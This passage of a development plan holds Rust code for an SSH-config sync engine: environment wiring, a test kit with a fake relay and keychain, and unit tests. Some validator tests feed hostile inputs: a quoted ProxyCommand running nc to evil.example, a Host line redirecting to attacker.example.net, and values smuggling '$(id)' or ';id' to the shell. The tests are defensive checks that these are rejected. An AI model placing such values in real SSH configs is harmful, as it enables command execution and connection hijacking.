/// 引擎每個操作需要的一切。生命週期 `'a` 綁在 app 狀態(或測試的替身)上;用完即丟,不跨執行緒保存。
pub struct SyncEnv<'a> {
    pub doc: &'a Mutex<Option<SshConfigDoc>>,
    pub backed_up: &'a Mutex<HashSet<PathBuf>>,
    pub retention: &'a Mutex<Option<usize>>,
    pub runtime: &'a SyncRuntime,
    /// `~/.ssh`(space 檔在 `~/.ssh/sshelter/`)。
    pub ssh_dir: PathBuf,
    /// `sync-state.json` 的路徑。
    pub state_path: PathBuf,
    /// 只給測試:載入 doc 時 Include 的 `~` 指向這裡(`config::include::with_test_home`)。production 為 None。
    pub home: Option<PathBuf>,
    pub keychain: &'a dyn Keychain,
    pub relays: &'a dyn RelayConnector,
    pub events: &'a dyn SyncEvents,
    pub clock: &'a dyn Clock,
    /// `std::env::consts::OS`(裝置記錄的 platform)。
    pub platform: &'static str,
}

impl SyncEnv<'_> {
    pub fn now(&self) -> u64 {
        self.clock.now_ms()
    }

    pub fn retention(&self) -> Option<usize> {
        *self.retention.lock().unwrap()
    }

    pub fn relay(&self, base_url: &str) -> Result<Box<dyn RelayApi>, AppError> {
        self.relays.connect(base_url)
    }

    /// 重新載入整份 config(主 config 與它 Include 的檔案)。測試時 `~` 指向測試的家目錄。
    pub fn load_doc(&self, main: &Path) -> Result<SshConfigDoc, AppError> {
        match &self.home {
            #[cfg(test)]
            Some(home) => crate::config::include::with_test_home(home, || crate::config::commands::load_doc_migrated(main)),
            _ => crate::config::commands::load_doc_migrated(main),
        }
    }
}
```

- [ ] **Step 3: 測試設施 `src-tauri/src/sync/testkit.rs`**

`testkit` 是測試設施(一台「裝置」= 暫存家目錄 + 自己的 doc / core 鎖 + 記憶體 keychain + 記錄下來的事件),整個檔案在這一步寫好。

建立 `src-tauri/src/sync/testkit.rs`:

```rust
//! 引擎測試的替身(只在測試建置):一台「裝置」= 暫存的家目錄(`.ssh/config`、`.ssh/sshelter/`、`data/` 裡的
//! 狀態檔)+ 自己的 doc / core 鎖 + 記憶體 keychain + 記錄下來的事件;多台裝置共用一個 `FakeRelay` 與一個
//! `TestClock`。絕不碰真正的家目錄、keychain 或網路。

use std::collections::{BTreeMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

use crate::config::commands::persist_file;
use crate::config::model::SshConfigDoc;
use crate::config::parser::parse_file;
use crate::error::AppError;
use crate::sync::crypto::ChainKeys;
use crate::sync::dto::{ApprovalNotice, SyncConflict};
use crate::sync::env::{Clock, Keychain, RelayConnector, SyncEnv, SyncEvents};
use crate::sync::fake_relay::{self, FakeRelay};
use crate::sync::files::note_written;
use crate::sync::merge::{put_account_record, put_space_key};
use crate::sync::record::{RecordKind, SpacePayload};
use crate::sync::relay::RelayApi;
use crate::sync::runtime::SyncRuntime;
use crate::sync::space_files::{slugify, space_file_name};
use crate::sync::state_v2::{AccountState, SpaceState, SyncNotice, SyncStateV2};

/// 測試裡的 relay URL(假 relay 不看它,只拒絕空字串)。
pub const RELAY_URL: &str = "https://relay.test";

/// 每讀一次就前進 1 ms 的時鐘:多台裝置的時間戳因此嚴格依呼叫順序遞增,LWW 的結果可預期。
pub struct TestClock(AtomicU64);

impl TestClock {
    pub fn new() -> Arc<Self> {
        Arc::new(Self(AtomicU64::new(1_700_000_000_000)))
    }

}

impl Clock for TestClock {
    fn now_ms(&self) -> u64 {
        self.0.fetch_add(1, Ordering::SeqCst)
    }
}

/// 記憶體 keychain;`fail_reads` / `fail_deletes` 模擬上鎖或被拒。
#[derive(Default)]
pub struct MemKeychain {
    entries: Mutex<BTreeMap<String, String>>,
    pub fail_reads: AtomicBool,
    pub fail_deletes: AtomicBool,
}

impl MemKeychain {
    pub fn entry(&self, account: &str) -> Option<String> {
        self.entries.lock().unwrap().get(account).cloned()
    }
}

impl Keychain for MemKeychain {
    fn get(&self, account: &str) -> Result<Option<String>, AppError> {
        if self.fail_reads.load(Ordering::SeqCst) {
            return Err(AppError::Other("keychain error: locked".to_string()));
        }
        Ok(self.entries.lock().unwrap().get(account).cloned())
    }
    fn set(&self, account: &str, secret: &str) -> Result<(), AppError> {
        self.entries.lock().unwrap().insert(account.to_string(), secret.to_string());
        Ok(())
    }
    fn delete(&self, account: &str) -> Result<(), AppError> {
        if self.fail_deletes.load(Ordering::SeqCst) {
            return Err(AppError::Other("keychain error: denied".to_string()));
        }
        self.entries.lock().unwrap().remove(account);
        Ok(())
    }
}

/// 記下引擎發出的每個事件。
#[derive(Default)]
pub struct RecordingEvents {
    statuses: AtomicUsize,
    wakes: AtomicUsize,
    pub applied: Mutex<Vec<usize>>,
    pub conflicts: Mutex<Vec<SyncConflict>>,
    pub approvals: Mutex<Vec<ApprovalNotice>>,
    pub notices: Mutex<Vec<SyncNotice>>,
}

impl RecordingEvents {
    pub fn statuses(&self) -> usize {
        self.statuses.load(Ordering::SeqCst)
    }
    pub fn wakes(&self) -> usize {
        self.wakes.load(Ordering::SeqCst)
    }
}

impl SyncEvents for RecordingEvents {
    fn status(&self) {
        self.statuses.fetch_add(1, Ordering::SeqCst);
    }
    fn applied(&self, hosts: usize) {
        self.applied.lock().unwrap().push(hosts);
    }
    fn conflict(&self, conflicts: &[SyncConflict]) {
        self.conflicts.lock().unwrap().extend_from_slice(conflicts);
    }
    fn approval(&self, waiting: &[ApprovalNotice]) {
        self.approvals.lock().unwrap().extend_from_slice(waiting);
    }
    fn notice(&self, notice: &SyncNotice) {
        self.notices.lock().unwrap().push(notice.clone());
    }
    fn wake(&self) {
        self.wakes.fetch_add(1, Ordering::SeqCst);
    }
}

pub struct FakeConnector(pub Arc<FakeRelay>);

impl RelayConnector for FakeConnector {
    fn connect(&self, base_url: &str) -> Result<Box<dyn RelayApi>, AppError> {
        fake_relay::connect(&self.0, base_url)
    }
}

/// 一台測試裝置。
pub struct TestDevice {
    pub home: tempfile::TempDir,
    pub doc: Mutex<Option<SshConfigDoc>>,
    pub backed_up: Mutex<HashSet<PathBuf>>,
    pub retention: Mutex<Option<usize>>,
    pub runtime: SyncRuntime,
    pub keychain: MemKeychain,
    pub events: RecordingEvents,
    pub relay: Arc<FakeRelay>,
    pub clock: Arc<TestClock>,
    connector: FakeConnector,
}

impl TestDevice {
    /// 主 config 只有一行註解的裝置。
    pub fn new(name: &str, relay: &Arc<FakeRelay>, clock: &Arc<TestClock>) -> Self {
        Self::with_main_config(name, relay, clock, "# main\n")
    }

    /// 自訂主 config 內容的裝置。device id 由名稱決定(`<name>` 補 0 到 32 字元),relay URL 是 `RELAY_URL`。
    pub fn with_main_config(name: &str, relay: &Arc<FakeRelay>, clock: &Arc<TestClock>, main: &str) -> Self {
        let home = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(home.path().join(".ssh")).unwrap();
        std::fs::write(home.path().join(".ssh").join("config"), main).unwrap();
        let mut state = SyncStateV2::fresh(name).unwrap();
        state.device_id = format!("{name:0<32}");
        state.relay_url = RELAY_URL.to_string();
        let device = Self {
            home,
            doc: Mutex::new(None),
            backed_up: Mutex::new(HashSet::new()),
            retention: Mutex::new(None),
            runtime: SyncRuntime::default(),
            keychain: MemKeychain::default(),
            events: RecordingEvents::default(),
            relay: Arc::clone(relay),
            clock: Arc::clone(clock),
            connector: FakeConnector(Arc::clone(relay)),
        };
        device.runtime.core.lock().unwrap().state = Some(state);
        device.reload();
        device
    }

    pub fn env(&self) -> SyncEnv<'_> {
        SyncEnv {
            doc: &self.doc,
            backed_up: &self.backed_up,
            retention: &self.retention,
            runtime: &self.runtime,
            ssh_dir: self.ssh_dir(),
            state_path: self.home.path().join("data").join("sync-state.json"),
            home: Some(self.home.path().to_path_buf()),
            keychain: &self.keychain,
            relays: &self.connector,
            events: &self.events,
            clock: self.clock.as_ref(),
            platform: "test",
        }
    }

    pub fn ssh_dir(&self) -> PathBuf {
        self.home.path().join(".ssh")
    }

    pub fn main_path(&self) -> PathBuf {
        self.ssh_dir().join("config")
    }

    /// 前端的 `config_load`:從磁碟整份重新載入 doc。
    pub fn reload(&self) {
        let doc = self.env().load_doc(&self.main_path()).unwrap();
        *self.doc.lock().unwrap() = Some(doc);
        self.backed_up.lock().unwrap().clear();
    }

    pub fn state(&self) -> SyncStateV2 {
        self.runtime.core.lock().unwrap().state.clone().expect("sync state")
    }

    pub fn read(&self, path: &Path) -> String {
        std::fs::read_to_string(path).unwrap()
    }

    pub fn main_config(&self) -> String {
        self.read(&self.main_path())
    }

    /// 這台勾選的 space 檔路徑(依狀態裡的檔名)。
    pub fn space_path(&self, space_id: &str) -> PathBuf {
        let file_name = self.state().spaces[space_id].file_name.clone();
        crate::sync::space_files::space_file_path(&self.ssh_dir(), &file_name).unwrap()
    }

    /// app 以外的編輯(另一個編輯器):直接改磁碟。
    pub fn write_externally(&self, path: &Path, text: &str) {
        std::fs::write(path, text).unwrap();
    }

    /// 在 app 裡存檔(同 `config_save_host` 等命令):改 doc → `persist_file` → 存檔 hook。檔案必須已載入 doc。
    pub fn save_in_app(&self, path: &Path, text: &str) {
        let env = self.env();
        let mut doc_lock = self.doc.lock().unwrap();
        let doc = doc_lock.as_mut().expect("config loaded");
        let idx = doc.files.iter().position(|f| f.path == path).expect("the file is loaded");
        let (items, trailing_newline) = parse_file(text);
        doc.files[idx].items = items;
        doc.files[idx].trailing_newline = trailing_newline;
        let mut backed_up = self.backed_up.lock().unwrap();
        persist_file(doc, idx, &mut backed_up, None).unwrap();
        note_written(&env, path, &doc.files[idx].items);
    }

    /// 直接把狀態設成「已加入一個帳戶、勾選了這些 space」(基線已建立),不經過 relay。回傳 space id(依參數順序)。
    pub fn join_with_spaces(&self, names: &[&str]) -> Vec<String> {
        let account_keys = ChainKeys::generate().unwrap();
        let now = self.clock.now_ms();
        let mut core = self.runtime.core.lock().unwrap();
        let s = core.state.as_mut().unwrap();
        let mut account = AccountState::new(&account_keys.chain_id);
        account.baseline_established = true;
        let mut ids = Vec::new();
        for name in names {
            let keys = ChainKeys::generate().unwrap();
            let payload = SpacePayload { schema: 1, name: name.to_string(), slug: slugify(name), created_at_ms: now, previous_id: None };
            put_account_record(&mut account, RecordKind::Space, &keys.chain_id, serde_json::to_value(payload).unwrap(), false, &s.device_id, now);
            put_space_key(&mut account, &account_keys, &keys.chain_id, Some(&keys), &s.device_id, now).unwrap();
            let mut space = SpaceState::new(&space_file_name(&slugify(name), &keys.chain_id).unwrap());
            space.baseline_established = true;
            s.spaces.insert(keys.chain_id.clone(), space);
            ids.push(keys.chain_id);
        }
        s.account = Some(account);
        core.account_keys = Some(account_keys);
        ids
    }
}
```

- [ ] **Step 4: 寫失敗的測試:`src-tauri/src/sync/runtime.rs`**

建立 `src-tauri/src/sync/runtime.rs`,先只放 module 註解、`use` 與測試(實作在後面的步驟加入):

```rust
//! Sync v2 的執行期狀態(spec §7.1):generation、狀態、帳戶金鑰同一把鎖(`SyncCore`),以及「局部提交」——
//! 一輪裡的每個提交只改它自己的區段(帳戶、某一個 space、或頂層欄位),在 core 鎖內比 generation;絕不以本輪開始時
//! 的整份狀態副本覆蓋(spec §12 #8)。任何生命週期或結構性變更都換 generation(`mutate`),在途輪次的提交因此全部
//! 作廢、整輪重跑。鎖順序固定:lifecycle → doc → backed_up → core。

use std::path::Path;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Mutex;

use crate::error::AppError;
use crate::sync::crypto::ChainKeys;
use crate::sync::env::SyncEnv;
use crate::sync::state::SyncState as LegacyState;
use crate::sync::state_v2::{self, SyncStateV2};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sync::testkit::{TestClock, TestDevice};
    use crate::sync::fake_relay::FakeRelay;

    #[test]
    fn a_commit_updates_only_the_latest_state_and_refuses_after_a_generation_change() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::new("a", &relay, &clock);
        let env = d.env();
        let generation = env.runtime.core.lock().unwrap().generation;
        commit(&env, generation, |s| {
            s.last_error = Some("one".into());
            Ok(())
        })
        .unwrap();
        // 另一個命令換了 generation:舊 generation 的提交被拒絕,狀態不變。
        mutate(&env, |s| {
            s.device_name = "Renamed".into();
            Ok(())
        })
        .unwrap();
        let refused = commit(&env, generation, |s| {
            s.last_error = Some("two".into());
            Ok(())
        });
        assert!(refused.as_ref().is_err_and(is_superseded));
        let s = snapshot(&env).unwrap();
        assert_eq!((s.last_error.as_deref(), s.device_name.as_str()), (Some("one"), "Renamed"));
        // 兩次都落盤。
        match state_v2::load(&env.state_path).unwrap() {
            state_v2::LoadedState::Current(saved) => assert_eq!(saved.device_name, "Renamed"),
            other => panic!("expected the saved v2 state, got {other:?}"),
        }
    }

    #[test]
    fn a_refused_mutation_changes_nothing() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::new("a", &relay, &clock);
        let env = d.env();
        let before = env.runtime.core.lock().unwrap().generation;
        assert!(mutate(&env, |_| Err::<(), _>(AppError::Other("no".into()))).is_err());
        assert_eq!(env.runtime.core.lock().unwrap().generation, before);
        env.runtime.core.lock().unwrap().save_blocked = Some("left in place".into());
        assert_eq!(mutate(&env, |_| Ok(())).unwrap_err().to_string(), "left in place");
        let mut core = env.runtime.core.lock().unwrap();
        assert_eq!(save_core(&mut core, &env.state_path).unwrap_err().to_string(), "left in place");
        assert!(!core.unsaved, "retrying cannot help; only a restart can");
    }
}
```

- [ ] **Step 5: 寫失敗的測試:`src-tauri/src/sync/files.rs`**

建立 `src-tauri/src/sync/files.rs`,先只放 module 註解、`use` 與測試(實作在後面的步驟加入):

```rust
//! Space 檔在 in-memory doc 與磁碟上的處理(spec §4.3、§7.1):準備檔案與 Include 清單、讀取並檢查每個 space 檔、
//! 以 space 為單位的「套用 + 發布」交易、存檔當下的規劃。所有寫檔都在 doc 鎖內;呼叫 `persist_file` 時**不持有**
//! core 鎖(存檔 hook 會拿它)。引擎自己的寫入以 `EngineWrite` 標記,存檔 hook 不把它當成本機編輯。

use std::cell::Cell;
use std::collections::{BTreeMap, BTreeSet, HashSet};
use std::path::{Path, PathBuf};
use std::time::UNIX_EPOCH;

use crate::config::commands::persist_file;
use crate::config::model::{ConfigFile, Item, SshConfigDoc};
use crate::config::serialize::serialize_items;
use crate::error::AppError;
use crate::fsutil::{self, Fingerprint};
use crate::sync::env::SyncEnv;
use crate::sync::hosts_file::{self, HostBlockText};
use crate::sync::merge::{plan_hosts, selected_include_tokens};
use crate::sync::reconcile::HostEffect;
use crate::sync::record::RecordKind;
use crate::sync::runtime::{save_core, superseded};
use crate::sync::space_files;
use crate::sync::state_v2::SpaceState;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::parser::parse_file;
    use crate::sync::fake_relay::FakeRelay;
    use crate::sync::record::{record_key, LocalRecord, Record};
    use crate::sync::testkit::{TestClock, TestDevice};

    fn host(alias: &str, deleted: bool, dirty: bool) -> (String, LocalRecord) {
        let record = Record {
            kind: RecordKind::Host,
            id: alias.into(),
            version: 1,
            updated_at_ms: 5,
            device_id: "dev-a".into(),
            deleted,
            payload: serde_json::json!({ "schema": 1, "text": format!("Host {alias}\n") }),
        };
        (record_key(RecordKind::Host, alias), LocalRecord { record, seq: 3, dirty })
    }

    #[test]
    fn effects_are_applied_in_order_and_report_whether_anything_changed() {
        let (mut items, _) = parse_file("Host a\n  User x\n\nHost b\n");
        let effects = vec![
            HostEffect::Upsert { alias: "a".into(), text: "Host a\n  User y\n\n".into() },
            HostEffect::Delete { alias: "b".into() },
            HostEffect::Upsert { alias: "c".into(), text: "Host c\n".into() },
        ];
        let (changed, failed) = apply_effects_to_items(&mut items, &effects);
        assert!(changed);
        assert!(failed.is_empty());
        assert_eq!(serialize_items(&items, true), "Host a\n  User y\n\nHost c\n");
        assert_eq!(apply_effects_to_items(&mut items, &[]), (false, Vec::new()));
    }

    #[test]
    fn a_broken_effect_does_not_stop_the_others_and_is_reported_by_alias() {
        // 純函式的回報語意;引擎本身把任何失敗當成全有或全無的中止(見 apply_and_commit)。
        let (mut items, _) = parse_file("Host a\nHost web *.internal\n  User ops\n");
        let effects = vec![
            HostEffect::Upsert { alias: "web".into(), text: "Host web\n  User root\n".into() },
            HostEffect::Upsert { alias: "bad".into(), text: "# not a host\n".into() },
            HostEffect::Upsert { alias: "ok".into(), text: "Host ok\n".into() },
        ];
        let (changed, failed) = apply_effects_to_items(&mut items, &effects);
        assert!(changed);
        assert_eq!(failed, vec!["web".to_string(), "bad".to_string()]);
        let text = serialize_items(&items, true);
        assert!(text.contains("Host ok"));
        assert!(text.contains("Host web *.internal\n  User ops\n"), "local wildcard block untouched");
        assert!(!text.contains("User root"));
    }

    #[test]
    fn managed_file_must_hold_only_named_unique_hosts() {
        let ok = parse_file("# synced\n\nHost a\n  User x\nHost b b.example.com\n").0;
        assert!(check_managed_items(&ok).is_ok());
        let wildcard = parse_file("Host a\nHost web *.internal\n").0;
        assert!(check_managed_items(&wildcard).unwrap_err().to_string().contains("wildcard"));
        let negated = parse_file("Host web !prod\n").0;
        assert!(check_managed_items(&negated).is_err());
        let dup = parse_file("Host a\n  User x\nHost a\n").0;
        assert!(check_managed_items(&dup).unwrap_err().to_string().contains("more than once"));
    }

    #[test]
    fn managed_file_may_not_contain_forbidden_directives() {
        let in_block = parse_file("Host a\n  Include ~/.ssh/extra.config\n").0;
        assert!(check_managed_items(&in_block).unwrap_err().to_string().contains("Include"));
        let top_level = parse_file("Include ~/.ssh/extra.config\nHost a\n").0;
        assert!(check_managed_items(&top_level).is_err());
        let quoted = parse_file("Host a\n  \"ProxyCommand\" nc evil.example 22\n").0;
        assert!(check_managed_items(&quoted).unwrap_err().to_string().contains("quoted keyword"));
        // 行首的 `=`:OpenSSH 略過它、把下一個詞當成 keyword;解析器的 keyword 是空字串。
        let leading_equals = parse_file("Host a\n  =Include ~/.ssh/extra.config\n").0;
        assert!(check_managed_items(&leading_equals).unwrap_err().to_string().contains("starting with '='"));
        // 訊息不回顯 keyword 或那一行:keyword 可能夾著值(`IdentityFile"/path"`),訊息會進狀態列與 last_error。
        let carries_a_value = parse_file("Host a\n  IdentityFile\"/Users/me/.ssh/id_work\"\n").0;
        let message = check_managed_items(&carries_a_value).unwrap_err().to_string();
        assert!(message.contains("quoted keyword") && !message.contains("id_work"), "{message}");
        assert!(check_managed_items(&parse_file("Host a\n  # Include ~/.ssh/extra.config\n").0).is_ok());
        // Host / Match 那一行 OpenSSH 讀到的 pattern 與解析器不同:`Host web#x *` 對解析器是具名的 `web`(通過 wildcard 檢查),
        // OpenSSH 讀到的卻是 `web#x` 與 `*`。訊息不回顯那一行。
        let glued = parse_file("Host a\nHost web#x *\n  HostName attacker.example.net\n").0;
        let message = check_managed_items(&glued).unwrap_err().to_string();
        assert!(message.contains("a Host line that OpenSSH reads differently") && !message.contains("attacker"), "{message}");
        let glued_match = parse_file("Host a\nMatch host a#x,*\n  User root\n").0;
        assert!(check_managed_items(&glued_match).unwrap_err().to_string().contains("a Match line that OpenSSH reads differently"));
        assert!(check_managed_items(&parse_file("Host web # office\n  User a\nMatch host web # c\n  User b\n").0).is_ok());
    }

    #[test]
    fn managed_file_may_not_contain_values_ssh_would_hand_to_a_shell_or_invisible_characters() {
        // `HostName` / `User` / `HostKeyAlias` / `ProxyJump` 的值會被 ssh 原樣展開進指令:整個檔案都查,含 top-level 與
        // Match 區塊內;訊息只說是哪個 keyword,不回顯值(它會進狀態列與 last_error)。
        for text in [
            "Host a\n  HostName \"secret.example$(id)\"\n",
            "User \"secret$(id)\"\nHost a\n",
            "Host a\nMatch all\n  ProxyJump \"secret.example;id\"\n",
        ] {
            let message = check_managed_items(&parse_file(text).0).unwrap_err().to_string();
            assert!(message.contains("value with characters ssh would pass to a shell"), "{message}");
            assert!(message.ends_with("which synced hosts cannot use; move that block to your main config"), "{message}");
            assert!(!message.contains("secret"), "{message}");
        }
        // OpenSSH 不把非 ASCII 的空白與控制字元當成空白,解析器與簽章卻會把它們吃掉。
        let invisible = parse_file("Host a\n  ForwardAgent no\u{a0}\n").0;
        let message = check_managed_items(&invisible).unwrap_err().to_string();
        assert!(message.contains("non-ASCII space or control character"), "{message}");
        // 正常的值與 CRLF 的檔案照常通過。
        assert!(check_managed_items(&parse_file("Host a\n  HostName 10.0.0.5 # office\n  User deploy\n  ProxyJump bastion,user@jump:2222\n").0).is_ok());
        assert!(check_managed_items(&parse_file("Host a\r\n  HostName 10.0.0.5\r\n  User deploy\r\n").0).is_ok());
    }

    #[test]
    fn in_memory_items_must_match_the_disk_bytes_exactly() {
        let text = "Host web\n  HostName 10.0.0.1\n\nHost db\n";
        let (mut items, trailing_newline) = parse_file(text);
        assert!(items_match_disk(&items, trailing_newline, text.as_bytes()));
        // 少了結尾換行 = 不同的 bytes。
        assert!(!items_match_disk(&items, false, text.as_bytes()));
        // doc 被改了、寫檔卻沒成功:in-memory 比磁碟新。
        hosts_file::apply_host_text(&mut items, "app", "Host app\n").unwrap();
        assert!(!items_match_disk(&items, trailing_newline, text.as_bytes()));
        // 空檔。
        let (empty, trailing) = parse_file("");
        assert!(items_match_disk(&empty, trailing, b""));
    }

    #[test]
    fn a_disk_file_matches_its_freshly_loaded_items_and_not_an_unsaved_edit() {
        // 只用暫存目錄。
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("hosts.config");
        std::fs::write(&path, "Host web\n  User x\n").unwrap();
        let (items, trailing_newline) = parse_file(&std::fs::read_to_string(&path).unwrap());
        let mut file = ConfigFile {
            path: path.clone(),
            items,
            trailing_newline,
            fingerprint: fsutil::file_fingerprint(&path).unwrap(),
        };
        assert!(memory_matches_disk(&file));
        hosts_file::remove_host_block(&mut file.items, "web");
        assert!(!memory_matches_disk(&file), "an edit that never reached the disk");
        std::fs::remove_file(&path).unwrap();
        assert!(!memory_matches_disk(&file), "an unreadable file never counts as matching");
    }

    #[test]
    fn engine_writes_are_flagged_only_inside_the_guard() {
        assert!(!engine_writing());
        {
            let _write = EngineWrite::begin();
            assert!(engine_writing());
        }
        assert!(!engine_writing());
    }

    #[test]
    fn space_files_are_created_before_they_are_listed_and_listed_in_name_order() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::with_main_config("a", &relay, &clock, "# main\nInclude ~/.ssh/sshelter/hosts.config\nHost local\n");
        let ids = d.join_with_spaces(&["Work", "home"]);
        let prepared = prepare_files(&d.env()).unwrap().unwrap();
        assert!(prepared.reloaded && prepared.rematerialized.is_empty());
        let (work, home) = (d.space_path(&ids[0]), d.space_path(&ids[1]));
        assert_eq!(d.read(&work), "");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(std::fs::metadata(&work).unwrap().permissions().mode() & 0o777, 0o600);
        }
        let line = format!(
            "Include ~/.ssh/sshelter/{} ~/.ssh/sshelter/{}",
            home.file_name().unwrap().to_string_lossy(),
            work.file_name().unwrap().to_string_lossy()
        );
        assert_eq!(d.main_config(), format!("# main\n{line}\nHost local\n"), "the v1 token is replaced, names sort case-insensitively");
        let loaded: Vec<PathBuf> = d.doc.lock().unwrap().as_ref().unwrap().files.iter().map(|f| f.path.clone()).collect();
        assert!(loaded.contains(&work) && loaded.contains(&home));
        // 第二次:什麼都不用做。
        assert_eq!(prepare_files(&d.env()).unwrap().unwrap(), Prepared::default());
    }

    #[test]
    fn a_half_unselected_space_is_unlisted_then_backed_up_and_deleted() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::new("a", &relay, &clock);
        let ids = d.join_with_spaces(&["Work", "Home"]);
        prepare_files(&d.env()).unwrap();
        let work = d.space_path(&ids[0]);
        d.write_externally(&work, "Host a\n");
        d.runtime.core.lock().unwrap().state.as_mut().unwrap().spaces.get_mut(&ids[0]).unwrap().selected = false;
        let prepared = prepare_files(&d.env()).unwrap().unwrap();
        assert!(prepared.reloaded);
        assert!(!work.exists());
        assert!(!d.main_config().contains(&work.file_name().unwrap().to_string_lossy().to_string()));
        assert!(!d.state().spaces.contains_key(&ids[0]));
        assert!(d.state().spaces.contains_key(&ids[1]));
    }

    #[test]
    fn a_vanished_space_file_is_restored_from_the_chain_and_the_other_spaces_are_untouched() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::new("a", &relay, &clock);
        let ids = d.join_with_spaces(&["Work", "Home"]);
        prepare_files(&d.env()).unwrap();
        {
            let mut core = d.runtime.core.lock().unwrap();
            let s = core.state.as_mut().unwrap();
            for id in &ids {
                let space = s.spaces.get_mut(id).unwrap();
                space.cursor_seq = 9;
                space.records.extend([host("web", false, false), host("edited", false, true), host("old", true, false)]);
            }
        }
        std::fs::remove_file(d.space_path(&ids[0])).unwrap();
        let before = d.runtime.core.lock().unwrap().generation;
        let prepared = prepare_files(&d.env()).unwrap().unwrap();
        assert_eq!(prepared.rematerialized, vec![ids[0].clone()]);
        assert!(d.runtime.core.lock().unwrap().generation > before);
        let s = d.state();
        let work = &s.spaces[&ids[0]];
        assert_eq!((work.cursor_seq, work.baseline_established), (0, false));
        assert_eq!(work.records.keys().cloned().collect::<Vec<_>>(), vec!["host:edited".to_string()], "only the unpushed edit is kept");
        assert_eq!(s.spaces[&ids[1]].cursor_seq, 9, "the other space is untouched");
        assert!(d.space_path(&ids[0]).exists(), "recreated empty after the reset was saved");
        // 已經在基線輪(剛重設、或剛勾選):重建空檔沒有風險,不再重設。
        std::fs::remove_file(d.space_path(&ids[0])).unwrap();
        assert!(prepare_files(&d.env()).unwrap().unwrap().rematerialized.is_empty());
    }

    #[test]
    fn an_invariant_violation_pauses_only_that_space() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::new("a", &relay, &clock);
        let ids = d.join_with_spaces(&["Work", "Home"]);
        prepare_files(&d.env()).unwrap();
        let (work, home) = (d.space_path(&ids[0]), d.space_path(&ids[1]));
        d.write_externally(&work, "Host a\n  Include ~/.ssh/extra.config\n");
        d.write_externally(&home, "Host b\n  User me\n");
        let (results, reloaded) = gather(&d.env(), &[(ids[0].clone(), work), (ids[1].clone(), home)]).unwrap();
        assert!(reloaded, "files edited outside the app are reloaded first");
        assert!(results[&ids[0]].as_ref().unwrap_err().contains("Include"));
        let ok = results[&ids[1]].as_ref().unwrap();
        assert_eq!(ok.blocks, vec![HostBlockText { alias: "b".into(), text: "Host b\n  User me\n".into() }]);
    }

    #[test]
    fn app_saves_are_planned_at_once_and_engine_writes_are_not() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::new("a", &relay, &clock);
        let ids = d.join_with_spaces(&["Work"]);
        prepare_files(&d.env()).unwrap();
        let work = d.space_path(&ids[0]);
        let before = d.runtime.core.lock().unwrap().generation;
        d.save_in_app(&work, "Host web\n  HostName 10.0.0.1\n");
        let s = d.state();
        assert!(s.spaces[&ids[0]].records["host:web"].dirty);
        assert!(d.runtime.core.lock().unwrap().generation > before);
        assert_eq!(d.events.wakes(), 1);
        // 引擎自己的寫入不算本機編輯。
        {
            let _engine = EngineWrite::begin();
            note_written(&d.env(), &work, &parse_file("Host other\n").0);
        }
        assert!(!d.state().spaces[&ids[0]].records.contains_key("host:other"));
        // 主 config 等其他檔案不算。
        note_written(&d.env(), &d.main_path(), &parse_file("Host x\n").0);
        assert!(!d.state().spaces[&ids[0]].records.contains_key("host:x"));
        // 基線輪還沒跑:不規劃,但仍換 generation。
        d.runtime.core.lock().unwrap().state.as_mut().unwrap().spaces.get_mut(&ids[0]).unwrap().baseline_established = false;
        let before = d.runtime.core.lock().unwrap().generation;
        note_written(&d.env(), &work, &parse_file("Host fresh\n").0);
        assert!(!d.state().spaces[&ids[0]].records.contains_key("host:fresh"));
        assert!(d.runtime.core.lock().unwrap().generation > before);
    }

    #[test]
    fn a_space_commit_writes_the_file_and_publishes_only_that_space() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::new("a", &relay, &clock);
        let ids = d.join_with_spaces(&["Work", "Home"]);
        prepare_files(&d.env()).unwrap();
        let work = d.space_path(&ids[0]);
        let generation = d.runtime.core.lock().unwrap().generation;
        let (results, _) = gather(&d.env(), &[(ids[0].clone(), work.clone())]).unwrap();
        let fingerprint = results[&ids[0]].as_ref().unwrap().fingerprint.clone();
        let mut next = d.state().spaces[&ids[0]].clone();
        next.cursor_seq = 42;
        // 這一輪開始之後,帳戶那一步記下了改名被擋:發布本 space 的合併結果時保留它。
        let blocked = Some(format!("lab-{}.config", &ids[0][..8]));
        d.runtime.core.lock().unwrap().state.as_mut().unwrap().spaces.get_mut(&ids[0]).unwrap().rename_blocked = blocked.clone();
        let effects = vec![HostEffect::Upsert { alias: "web".into(), text: "Host web\n".into() }];
        match apply_and_commit_space(&d.env(), generation, &ids[0], &work, &fingerprint, &effects, &next).unwrap() {
            Applied::Committed { wrote, save_error } => assert!(wrote && save_error.is_none()),
            other => panic!("expected a commit, got {other:?}"),
        }
        assert_eq!(d.read(&work), "Host web\n", "the first host written into an empty file ends with a newline");
        let s = d.state();
        assert_eq!(s.spaces[&ids[0]].cursor_seq, 42);
        assert_eq!(s.spaces[&ids[0]].rename_blocked, blocked);
        assert_eq!(s.spaces[&ids[1]].cursor_seq, 0);
        // 檔案在讀取之後被改過:本 space 作廢。
        d.write_externally(&work, "Host web\n  User x\n");
        let again = apply_and_commit_space(&d.env(), generation, &ids[0], &work, &fingerprint, &[], &next).unwrap();
        assert!(matches!(again, Applied::FileChanged));
        // generation 變了:被搶先。
        d.runtime.core.lock().unwrap().generation += 1;
        assert!(apply_and_commit_space(&d.env(), generation, &ids[0], &work, &fingerprint, &[], &next)
            .is_err_and(|e| crate::sync::runtime::is_superseded(&e)));
    }
}
```

